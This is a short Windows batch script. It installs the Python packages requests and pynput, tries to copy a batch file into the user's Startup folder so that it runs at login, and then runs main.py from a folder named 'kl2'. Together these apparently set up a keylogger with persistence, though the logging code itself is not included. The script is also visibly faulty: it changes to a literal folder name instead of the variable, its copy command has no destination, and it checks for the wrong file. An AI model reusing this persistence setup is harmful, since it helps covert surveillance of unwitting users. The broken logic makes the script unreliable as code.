@echo off
echo Installing required packages...

cd C:\users\%USERNAME%\kl2

pip install requests
pip install pynput

echo Checking for existing autostart rule...
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set AUTOSTART_FILE=C:\users\%USERNAME%\run.bat

cd STARTUP_FOLDER

if not exist "%AUTOSTART_FILE%" (
    echo Adding autostart rule...
    copy autostart.bat
) else (
    echo Autostart rule already exists. Skipping.
)

cd C:\users\%USERNAME%\kl2

echo Running main.py...
main.py
if %errorlevel% neq 0 (
    echo Error occurred while running main.py.
    pause
)

exit
